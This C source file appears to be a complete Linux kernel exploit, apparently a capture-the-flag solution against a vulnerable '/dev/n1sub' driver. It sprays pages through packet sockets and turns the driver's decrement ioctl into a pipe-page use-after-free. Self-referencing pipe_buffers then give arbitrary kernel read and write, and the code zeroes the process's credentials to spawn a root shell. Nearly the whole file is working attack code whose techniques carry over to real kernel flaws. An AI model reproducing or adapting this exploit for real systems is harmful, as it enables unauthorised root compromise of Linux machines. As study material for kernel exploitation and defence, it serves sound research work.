#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sched.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <stdint.h>

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"

#define logd(fmt, ...) \
    dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...)                                                    \
    dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...)                                                     \
    dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...)                                                  \
    dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                      \
    do {                                   \
        loge(fmt, ##__VA_ARGS__);          \
        loge("Exit at line %d", __LINE__); \
        exit(1);                           \
    } while (0)

#define o(x) (kbase + x)

size_t pop_rdi = 0x2c9d;
size_t commit_creds = 0xbb5b0;
size_t init_cred = 0x1a4cbf8;
size_t swapgs_restore_regs_and_return_to_usermode = 0x1000f01;
size_t prepare_kernel_cred = 0xf8520;

unsigned long user_cs, user_ss, user_eflags, user_sp, user_ip;

void get_shell() {
    int uid;
    if (!(uid = getuid())) {
        logi("root get!!");
        execl("/bin/sh", "sh", NULL);
    } else {
        die("gain root failed, uid: %d", uid);
    }
}

void saveStatus(void) {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_eflags;"
            );

    user_ip = (uint64_t)&get_shell;
    user_sp = 0xf000 +
              (uint64_t)mmap(0, 0x10000, 6, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
}

void bind_cpu(int cpu_idx) {
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(cpu_idx, &my_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &my_set)) {
        die("sched_setaffinity: %m");
    }
}

void hexdump(const void *data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        dprintf(2, "%02X ", ((unsigned char *)data)[i]);
        if (((unsigned char *)data)[i] >= ' ' &&
            ((unsigned char *)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char *)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i + 1) % 8 == 0 || i + 1 == size) {
            dprintf(2, " ");
            if ((i + 1) % 16 == 0) {
                dprintf(2, "|  %s \n", ascii);
            } else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) {
                    dprintf(2, " ");
                }
                for (j = (i + 1) % 16; j < 16; ++j) {
                    dprintf(2, "   ");
                }
                dprintf(2, "|  %s \n", ascii);
            }
        }
    }
}

void unshare_setup(void)
{
    char edit[0x100];
    int tmp_fd;

    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    tmp_fd = open("/proc/self/setgroups", O_WRONLY);
    write(tmp_fd, "deny", strlen("deny"));
    close(tmp_fd);

    tmp_fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getuid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);

    tmp_fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getgid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);
}

struct page;
struct pipe_inode_info;
struct pipe_buf_operations;

/* read start from len to offset, write start from offset */
struct pipe_buffer {
	struct page *page;
	unsigned int offset, len;
	const struct pipe_buf_operations *ops;
	unsigned int flags;
	unsigned long private;
};

struct pipe_buf_operations {
	/*
	 * ->confirm() verifies that the data in the pipe buffer is there
	 * and that the contents are good. If the pages in the pipe belong
	 * to a file system, we may need to wait for IO completion in this
	 * hook. Returns 0 for good, or a negative error value in case of
	 * error.  If not present all pages are considered good.
	 */
	int (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);

	/*
	 * When the contents of this pipe buffer has been completely
	 * consumed by a reader, ->release() is called.
	 */
	void (*release)(struct pipe_inode_info *, struct pipe_buffer *);

	/*
	 * Attempt to take ownership of the pipe buffer and its contents.
	 * ->try_steal() returns %true for success, in which case the contents
	 * of the pipe (the buf->page) is locked and now completely owned by the
	 * caller. The page may then be transferred to a different mapping, the
	 * most often used case is insertion into different file address space
	 * cache.
	 */
	int (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);

	/*
	 * Get a reference to the pipe buffer.
	 */
	int (*get)(struct pipe_inode_info *, struct pipe_buffer *);
};

/**
 * III -  pgv pages sprayer related 
 * not that we should create two process:
 * - the parent is the one to send cmd and get root
 * - the child creates an isolate userspace by calling unshare_setup(),
 *      receiving cmd from parent and operates it only
 */
#define PGV_PAGE_NUM 1000
#define PACKET_VERSION 10
#define PACKET_TX_RING 13

struct tpacket_req {
    unsigned int tp_block_size;
    unsigned int tp_block_nr;
    unsigned int tp_frame_size;
    unsigned int tp_frame_nr;
};

/* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */
struct pgv_page_request {
    int idx;
    int cmd;
    unsigned int size;
    unsigned int nr;
};

/* operations type */
enum {
    CMD_ALLOC_PAGE,
    CMD_FREE_PAGE,
    CMD_EXIT,
};

/* tpacket version for setsockopt */
enum tpacket_versions {
    TPACKET_V1,
    TPACKET_V2,
    TPACKET_V3,
};

/* pipe for cmd communication */
int cmd_pipe_req[2], cmd_pipe_reply[2];

/* create a socket and alloc pages, return the socket fd */
int create_socket_and_alloc_pages(unsigned int size, unsigned int nr)
{
    struct tpacket_req req;
    int socket_fd, version;
    int ret;

    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
    if (socket_fd < 0) {
        printf("[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n");
        ret = socket_fd;
        goto err_out;
    }

    version = TPACKET_V1;
    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, 
                     &version, sizeof(version));
    if (ret < 0) {
        printf("[x] failed at setsockopt(PACKET_VERSION)\n");
        goto err_setsockopt;
    }

    memset(&req, 0, sizeof(req));
    req.tp_block_size = size;
    req.tp_block_nr = nr;
    req.tp_frame_size = 0x1000;
    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req));
    if (ret < 0) {
        printf("[x] failed at setsockopt(PACKET_TX_RING)\n");
        goto err_setsockopt;
    }

    return socket_fd;

err_setsockopt:
    close(socket_fd);
err_out:
    return ret;
}

/* the parent process should call it to send command of allocation to child */
int alloc_page(int idx, unsigned int size, unsigned int nr)
{
    struct pgv_page_request req = {
        .idx = idx,
        .cmd = CMD_ALLOC_PAGE,
        .size = size,
        .nr = nr,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(struct pgv_page_request));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    return ret;
}

/* the parent process should call it to send command of freeing to child */
int free_page(int idx)
{
    struct pgv_page_request req = {
        .idx = idx,
        .cmd = CMD_FREE_PAGE,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(req));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    usleep(10000);

    return ret;
}

/* the child, handler for commands from the pipe */
void spray_cmd_handler(void)
{
    struct pgv_page_request req;
    int socket_fd[PGV_PAGE_NUM];
    int ret;

    /* create an isolate namespace*/
    unshare_setup();

    /* handler request */
    do {
        read(cmd_pipe_req[0], &req, sizeof(req));

        if (req.cmd == CMD_ALLOC_PAGE) {
            ret = create_socket_and_alloc_pages(req.size, req.nr);
            socket_fd[req.idx] = ret;
        } else if (req.cmd == CMD_FREE_PAGE) {
            ret = close(socket_fd[req.idx]);
        } else {
            printf("[x] invalid request: %d\n", req.cmd);
        }

        write(cmd_pipe_reply[1], &ret, sizeof(ret));
    } while (req.cmd != CMD_EXIT);
}

/* init pgv-exploit subsystem :) */
void prepare_pgv_system(void)
{
    /* pipe for pgv */
    pipe(cmd_pipe_req);
    pipe(cmd_pipe_reply);
    
    /* child process for pages spray */
    if (!fork()) {
        spray_cmd_handler();
    }
}

/**
 * IV - config for page-level heap spray and heap fengshui
 */
#define PIPE_SPRAY_NUM 200

#define PGV_1PAGE_SPRAY_NUM 0x20

#define PGV_4PAGES_START_IDX PGV_1PAGE_SPRAY_NUM
#define PGV_4PAGES_SPRAY_NUM 0x40

#define PGV_8PAGES_START_IDX (PGV_4PAGES_START_IDX + PGV_4PAGES_SPRAY_NUM)
#define PGV_8PAGES_SPRAY_NUM 0x40

int pgv_1page_start_idx = 0;
int pgv_4pages_start_idx = PGV_4PAGES_START_IDX;
int pgv_8pages_start_idx = PGV_8PAGES_START_IDX;

/* spray pages in different size for various usages */
void prepare_pgv_pages(void)
{
    /**
     * We want a more clear and continuous memory there, which require us to 
     * make the noise less in allocating order-3 pages.
     * So we pre-allocate the pages for those noisy objects there.
     */
    puts("[*] spray pgv order-0 pages...");
    for (int i = 0; i < PGV_1PAGE_SPRAY_NUM; i++) {
        if (alloc_page(i, 0x1000, 1) < 0) {
            printf("[x] failed to create %d socket for pages spraying!\n", i);
        }
    }

    puts("[*] spray pgv order-2 pages...");
    for (int i = 0; i < PGV_4PAGES_SPRAY_NUM; i++) {
        if (alloc_page(PGV_4PAGES_START_IDX + i, 0x1000 * 4, 1) < 0) {
            printf("[x] failed to create %d socket for pages spraying!\n", i);
        }
    }

    /* spray 8 pages for page-level heap fengshui */
    puts("[*] spray pgv order-3 pages...");
    for (int i = 0; i < PGV_8PAGES_SPRAY_NUM; i++) {
        /* a socket need 1 obj: sock_inode_cache, 19 objs for 1 slub on 4 page*/
        if (i % 19 == 0) {
            free_page(pgv_4pages_start_idx++);
        }

        /* a socket need 1 dentry: dentry, 21 objs for 1 slub on 1 page */
        if (i % 21 == 0) {
            free_page(pgv_1page_start_idx += 2);
        }

        /* a pgv need 1 obj: kmalloc-8, 512 objs for 1 slub on 1 page*/
        if (i % 512 == 0) {
            free_page(pgv_1page_start_idx += 2);
        }

        if (alloc_page(PGV_8PAGES_START_IDX + i, 0x1000 * 8, 1) < 0) {
            printf("[x] failed to create %d socket for pages spraying!\n", i);
        }
    }

    puts("");
}

struct pipe_buffer leak_buffer;
int c = 16;

size_t vmemmap_base;

#define PIPE_FD_MAX 0x100
int pipe_fds[PIPE_FD_MAX][2];
int extend_pipe_buffer(int start_idx, int nr)
{
    for (int i = 0; i < nr; i++) {
        /* a pipe_buffer on 1k is for 16 pages, so 4k for 64 pages */
        if (fcntl(pipe_fds[start_idx + i][1], F_SETPIPE_SZ, 0x1000 * c) < 0) {
            printf("[x] failed to extend %d pipe!\n", start_idx + i);
            return -1;
        }
    }

    return 0;
}

size_t kbase;
char buf[0x1000];

#define CMD_ADD 0xdeadbee0
#define CMD_DEL 0xdeadbee1
#define CMD_SUB 0xdeadbee2
/* for pipe escalation */
#define SND_PIPE_BUF_SZ 96
#define TRD_PIPE_BUF_SZ 192

int g_fd = -1;
int evil_A_fd = -1, evil_B_fd = -1, evil_C_fd = -1;
char zero[0x1000];
struct pipe_buffer evil_A, evil_B, evil_C;

uint sub_add(unsigned int *arg) {
    size_t ret = 0;
    ret = ioctl(g_fd, CMD_ADD, arg);
    return ret;
}

void sub_del(int idx) { ioctl(g_fd, CMD_DEL, idx); }

void sub_sub(int idx) { ioctl(g_fd, CMD_SUB, idx); }

void sub_cnt(int idx, int cnt) {
    for (int i = 0; i < cnt; i++) {
        sub_sub(idx);
    }
}

void aar_by_pipe(void *page_to_read, void *buf, size_t sz, off_t off) {
    evil_A.page = page_to_read;
    evil_A.len = 0x1ff8;
    evil_A.offset = off;

    // C -> A
    write(pipe_fds[evil_B_fd][1], &evil_C, sizeof(struct pipe_buffer));

    // A -> page, C -> B
    write(pipe_fds[evil_C_fd][1], &evil_A, sizeof(struct pipe_buffer));
    write(pipe_fds[evil_C_fd][1], zero, TRD_PIPE_BUF_SZ - sizeof(struct pipe_buffer));

    // B -> C

    write(pipe_fds[evil_C_fd][1], &evil_B, TRD_PIPE_BUF_SZ - sizeof(struct pipe_buffer));

    int ret = read(pipe_fds[evil_A_fd][0], buf, sz);
    logd("read: %d", ret);
}

void aaw_by_pipe(void *page_to_read, void *buf, size_t sz, off_t off) {
    evil_A.page = page_to_read;
    evil_A.len = 0;
    evil_A.offset = off;

    // C -> A
    write(pipe_fds[evil_B_fd][1], &evil_C, sizeof(struct pipe_buffer));

    // A -> page, C -> B
    write(pipe_fds[evil_C_fd][1], &evil_A, sizeof(struct pipe_buffer));
    write(pipe_fds[evil_C_fd][1], zero, TRD_PIPE_BUF_SZ - sizeof(struct pipe_buffer));

    // B -> C

    write(pipe_fds[evil_C_fd][1], &evil_B, TRD_PIPE_BUF_SZ - sizeof(struct pipe_buffer));

    write(pipe_fds[evil_A_fd][1], buf, sz);
    logd("write");
}

size_t direct_map_addr_to_page_addr(size_t direct_map_addr,
                                    ssize_t page_offset) {
    size_t page_count;

    page_count = ((direct_map_addr & (~0xfff)) - page_offset) / 0x1000;

    return vmemmap_base + page_count * 0x40;
}

void leak_and_pwn() {
    prctl(PR_SET_NAME, "FindMe");

    uint64_t leak_buf[0x1000 / 8];
    memset(leak_buf, 0, sizeof(leak_buf));

    uint64_t *p;
    uint64_t parent_task, current_cred, page_offset_base;
    for (int i = 0;; i++) {
        aar_by_pipe((void *)(vmemmap_base + 0x40 * i), leak_buf, 0xff0, 0);
        p = memmem(leak_buf, 0xff0, "FindMe", 6);
        if (p && (p[-2] > 0xffff888000000000) /* task->cred */
            && (p[-3] > 0xffff888000000000)   /* task->real_cred */
            && (p[-61] > 0xffff888000000000)  /* task->read_parent */
            && (p[-60] > 0xffff888000000000)) {
            parent_task = p[-61];
            current_cred = p[-2];
            page_offset_base = (p[-54] & 0xfffffffffffff000) - i * 0x1000;
            page_offset_base &= 0xfffffffff0000000;
            printf("\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n",
                   page_offset_base);
            printf("\033[34m\033[1m[*] current cred's addr: \033[0m"
                   "0x%lx\n\n",
                   current_cred);
            break;
        }
    }

    int payload[0x20 / 4];
    memset(payload, 0, sizeof(payload));
    aaw_by_pipe(
        (void *)direct_map_addr_to_page_addr(current_cred, page_offset_base),
        payload, 0x20, (current_cred&0xfff)+4);
    // debug();
    system("/bin/sh");
}


int main() {
    bind_cpu(0);

    g_fd = open("/dev/n1sub", O_RDWR);
    if (g_fd < 0) {
        die("open /dev/n1sub failed\n");
    }

    memset(buf, 'C', sizeof(buf));
    /* spray pgv pages */
    prepare_pgv_system();
    prepare_pgv_pages();

    size_t size;
    int ret;
    unsigned int sub_offset;
    int find_flag = 0;
    size = sub_add(&sub_offset);

    logd("size: 0x%x", size);
    logd("sub_offset: 0x%x", sub_offset);

    for (int i = 0x0; i < 0x20; i++) {
        if (pipe(pipe_fds[i]) < 0) {
            die("pipe failed\n");
        }
    }

    sub_del(0);
    for (int i = 0x20; i < PIPE_FD_MAX; i++) {
        if (pipe(pipe_fds[i]) < 0) {
            die("pipe failed\n");
        }
    }

    int t[0x1000];
    memset(t, 0x41, sizeof(t));
    for (int i = 0x0; i < PIPE_FD_MAX; i++) {;
        for(int j = 0; j < 0x10; j++){
            t[j] = i;
            t[0x400 + j] = i;
            t[0x800 + j] = i;
            t[0xc00 + j] = i;
        }
        write(pipe_fds[i][1], t, 0x2000 + sizeof(int)*6);
    }

    sub_cnt(0, 0x40 * 3);
    int ori = -1;
    int vic = -1;
    int ori_2nd = -1;
    int vic_2nd = -1;
    for (int i = 0; i < PIPE_FD_MAX; i++) {
        int tmp = i;
        read(pipe_fds[i][0], t, 0x1000);
        read(pipe_fds[i][0], t, 0x1000);
        read(pipe_fds[i][0], &tmp, sizeof(tmp));
        if(find_flag == 0)
            if (tmp != i) {
                ori = i;
                vic = tmp;
                find_flag = 1;
            }
    }
    if (find_flag == 0) {
        die("ori or vic not found\n");
    }
    /**
     * Now, the 3rd page of pipe_fds[ori] and pipe_fds[vic] are the same.
     */
    logi("ori: %d, vic: %d", ori, vic);

    /* let the page's ptr at pipe_buffer */
    write(pipe_fds[vic][1], buf, SND_PIPE_BUF_SZ*2- 24);

    logd("free ori");
    close(pipe_fds[ori][0]);
    close(pipe_fds[ori][1]);

    logd("refill with pipe");
    size_t snd_pipe_sz = 0x1000 * (SND_PIPE_BUF_SZ/sizeof(struct pipe_buffer));
    for (int i = 0; i < PIPE_FD_MAX; i++) {
        if (i == vic || i == ori) {
            continue;
        }

        fcntl(pipe_fds[i][1], F_SETPIPE_SZ, snd_pipe_sz);
    }

    struct pipe_buffer leak_buffer;
    struct pipe_buffer evil_pipe_buf;
    memset(&leak_buffer, 0, sizeof(struct pipe_buffer));

    read(pipe_fds[vic][0], buf,  SND_PIPE_BUF_SZ - sizeof(int));
    hexdump(buf, SND_PIPE_BUF_SZ);
    ret = read(pipe_fds[vic][0], &leak_buffer,
         sizeof(struct pipe_buffer)); // one pipe's 2rd pipe buffer
    logd("read %d", ret);
    kbase =
        (uint64_t)leak_buffer.ops - (0xffffffff8221e280 - 0xffffffff81000000);
    vmemmap_base = (uint64_t)leak_buffer.page & 0xfffffffff0000000;
    logd("leak_buffer->page: %p", leak_buffer.page);
    logd("leak_buffer->ops: %p", leak_buffer.ops);
    logd("leak_buffer->flag: %x", leak_buffer.flags);
    logd("leak_buffer->offset: %x", leak_buffer.offset);
    logd("leak_buffer->len: %x", leak_buffer.len);
    logd("kernbase: 0x%lx", kbase);
    logd("vmemmap base: 0x%lx", vmemmap_base);

    uint64_t leak_page = (uint64_t)leak_buffer.page;
    logd("leak_page: 0x%lx", leak_page);

    // // debug
    // ret = read(pipe_fds[vic][0], buf,  0x200);
    // logd("ret: %d", ret);
    // hexdump(buf, ret);

    uint64_t target = leak_page + 0xc0 * 2;
    leak_buffer.page = (struct page*) target;
    write(pipe_fds[vic][1], &leak_buffer, sizeof(struct pipe_buffer));


    logd("construct a second-level uaf pipe page...");
    for (int i = 0; i < PIPE_FD_MAX; i++) {
        int nr;

        if (i == ori || i == vic) {
            continue;
        }

        ret = read(pipe_fds[i][0], &nr, sizeof(nr));
        // logd("ret: %d, nr: %d",ret, nr);
        if (ret > 0 && nr < PIPE_FD_MAX && i != nr) {
            ori_2nd = nr;
            vic_2nd = i;
            logi("ori_2nd: %d, vic_2nd: %d", ori_2nd, vic_2nd);
            // break;
        }
    }
    if (vic_2nd == -1) {
        die("FAILED to corrupt second-level pipe_buffer!");
    }

    memset(buf, 'C', sizeof(buf));
    /* let the page's ptr at pipe_buffer */
    write(pipe_fds[vic_2nd][1], buf, TRD_PIPE_BUF_SZ - 24 );

    /* free orignal pipe's page */
    close(pipe_fds[ori_2nd][0]);
    close(pipe_fds[ori_2nd][1]);

    size_t trd_pipe_sz = 0x1000 * (TRD_PIPE_BUF_SZ/sizeof(struct pipe_buffer));
    for (int i = 0; i < PIPE_FD_MAX; i++) {
        if (i == vic || i == ori || i == ori_2nd || i == vic_2nd) {
            continue;
        }

        fcntl(pipe_fds[i][1], F_SETPIPE_SZ, trd_pipe_sz);
    }

    // // debug
    // ret = read(pipe_fds[vic_2nd][0], buf,  0x200);
    // logd("ret: %d", ret);
    // hexdump(buf, ret);

    /* let a pipe->bufs pointing to itself */
    puts("[*] hijacking the 2nd pipe_buffer on page to itself...");
    evil_pipe_buf.page = leak_buffer.page;
    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;
    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;
    evil_pipe_buf.ops = leak_buffer.ops;
    evil_pipe_buf.flags = leak_buffer.flags;
    evil_pipe_buf.private = leak_buffer.private;
    // A
    write(pipe_fds[vic_2nd][1], &evil_pipe_buf, sizeof(evil_pipe_buf));
    // B
    write(pipe_fds[vic_2nd][1],buf,TRD_PIPE_BUF_SZ-sizeof(evil_pipe_buf));
    write(pipe_fds[vic_2nd][1], &evil_pipe_buf, sizeof(evil_pipe_buf));
    // C
    write(pipe_fds[vic_2nd][1],buf,TRD_PIPE_BUF_SZ-sizeof(evil_pipe_buf));
    write(pipe_fds[vic_2nd][1], &evil_pipe_buf, sizeof(evil_pipe_buf));
    uint64_t page_ptr = 0;

    logd("target: %p", leak_buffer.page);
    /* check for third-level victim pipe */
    for (int i = 0; i < PIPE_SPRAY_NUM; i++) {
        if (i == ori || i == vic 
            || i == ori_2nd || i == vic_2nd) {
            continue;
        }

        read(pipe_fds[i][0], &page_ptr, sizeof(page_ptr));
        if (page_ptr == target) {
            if (evil_A_fd == -1) {
                evil_A_fd = i;
                continue;
            }
            if (evil_B_fd == -1) {
                evil_B_fd = i;
                continue;
            }
            if (evil_C_fd == -1) {
                evil_C_fd = i;
                continue;
            }
            die("wtf?");
        }
    }

    if (evil_A_fd == -1) {
        die("FAILED to build a self-writing pipe!");
    }

    // setup
    /* init the initial val for 2nd,3rd and 4th pipe, for recovering only */
    logd("evil_A = %d", evil_A_fd);
    read(pipe_fds[evil_A_fd][0], &evil_A.offset, sizeof(struct pipe_buffer) - 8);
    evil_A.page = (struct page*)target;
    logd("evil_A.page = %p", evil_A.page);
    logd("evil_A.offset = %lx", evil_A.offset);
    logd("evil_A.len = %lx", evil_A.len);
    logd("evil_B = %d", evil_B_fd);
    logd("evil_C = %d", evil_C_fd);

    // setup page
    memcpy(&evil_B, &evil_A, sizeof(evil_A));
    memcpy(&evil_C, &evil_A, sizeof(evil_A));

    evil_A.len = 0xff0;
    evil_A.offset = 0x0;

    evil_B.offset = TRD_PIPE_BUF_SZ * 3; // b-> c
    evil_B.len = 0;

    evil_C.offset = TRD_PIPE_BUF_SZ; // c-> a
    evil_C.len = 0;
    write(pipe_fds[evil_C_fd][1], &evil_B, sizeof(evil_B));

    logd("hacking");
    leak_and_pwn();
    getchar();
}